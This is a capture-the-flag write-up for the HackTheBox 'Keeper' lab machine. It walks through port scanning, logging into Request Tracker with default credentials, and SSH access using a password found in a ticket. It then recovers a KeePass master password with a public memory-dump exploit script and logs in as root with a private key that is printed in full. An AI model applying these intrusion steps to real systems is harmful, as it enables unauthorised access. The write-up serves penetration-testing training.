# Keeper

# User Flag

## NMAP Enumeration

Masscan UDP/TCP Port Scan:

```bash
sudo masscan -p1-65535,U:1-65535 10.10.11.227 --rate=1000 -e tun0

Discovered open port 80/tcp on 10.10.11.227                                    
Discovered open port 22/tcp on 10.10.11.227
```

NMAP All Open ports:

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN nmap-report-all-open-ports

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

All Ports (Filtered, Closed, etc.)

```bash
sudo nmap -T5 -sS -vvv --min-rate=100 --max-retries=3 -p- -oN nmap-report-all-ports 10.10.11.227

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Port Service Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report-service-scan 10.10.11.227 -p 22,80

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration (Port 80)

Navigating to the website hosted on port 80 provides the following text:

```bash
To raise an IT support ticket, please visit tickets.keeper.htb/rt/
```

Edited `/etc/hosts` file and added entries the domain and subdomain observed:

```bash
10.10.11.227    keeper.htb
10.10.11.227    tickets.keeper.htb
```

New login webpage is returned when navigating to `http://tickets.keeper.htb/rt/`:

![Login Page](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Linux%20Machines/Keeper/Images/Login%20Page.png)

Default credentials `root:password` were found in this [link](https://wiki.gentoo.org/wiki/Request_Tracker#:~:text=%2D%2Daction%20comment-,Log%20in,root%20%2C%20and%20password%20is%20password%20.) that work and I am able to login.

![Successful Login](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Linux%20Machines/Keeper/Images/Successful%20Login.png)

Under Admin tab, can see two users are enabled.

![Enabled Users](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Linux%20Machines/Keeper/Images/Users%20Enabled.png)

Looking through the ticketing system, was able to find the user `lnorgaard@keeper.htb` and a comment with a default passowrd `Welcome2023!`.

![Default Credentials](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Linux%20Machines/Keeper/Images/Default%20Password.png)

Was then able to SSH into target machine using credentials `lnorgaard:Welcome2023!`:

```bash
ssh lnorgaard@10.10.11.227

lnorgaard@keeper:~$ id
uid=1000(lnorgaard) gid=1000(lnorgaard) groups=1000(lnorgaard)
```

Recovered user.txt flag:

```bash
lnorgaard@keeper:~$ cat user.txt
71ba772bc110ce065983.........
```

# Root Flag

Found a file titled `RT30000.zip` and copied it back to my local machine.

```bash
scp lnorgaard@10.10.11.227:/home/lnorgaard/RT30000.zip .
```

Unzipping the file provides two files:

```bash
-rwxr-x---  1 kali kali 253395188 May 24  2023 KeePassDumpFull.dmp
-rwxr-x---  1 kali kali      3630 May 24  2023 passcodes.kdbx
```

Used `keepass2john` command to get hash:

```bash
keepass2john passcodes.kdbx 
passcodes:$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc
```

Tried to crack hash with `hashcat` but didn't work:

```bash
hashcat64.exe -m 13400 -a 0 hash.txt rockyou.txt -o cracked.txt
```

Noticed ZIP contained a dump file titled `KeePassDumpFull.dmp` and a search online for exploits related to keepass dump files returns multiple exploit [scripts](https://github.com/vdohney/keepass-password-dumper).

Ran the script above and got the following output:

```bash
python3 poc.py -d ../KeePassDumpFull.dmp

2024-09-04 19:26:31,685 [.] [main] Opened ../KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

We get a partial password but a search online for `●,dgr●d med fl●de` returns the phrase `rødgrød med fløde`. This appears to work and we can access the database using this phrase as the master key. I was then able to find a SSH key for the server.

![KeePass](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Linux%20Machines/Keeper/Images/KeePass.png)

Copied the ssh contents to `ssh_key_file` and used `puttygen` to convert it to a private SSH key for the root user.

```bash
echo "PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
" > ssh_key_file
```

The puttygen`` command:

```bash
puttygen ssh_key_file -O private-openssh -o id_rsa
```

Change the permissions of the file, then use the private key to login as root.

```bash
chmod 600 id_rsa

ssh root@keeper.htb -i id_rsa    
The authenticity of host 'keeper.htb (10.10.11.227)' can't be established.
ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added 'keeper.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~#
```

Got root flag:

```bash
0ee8a7fb145....
```







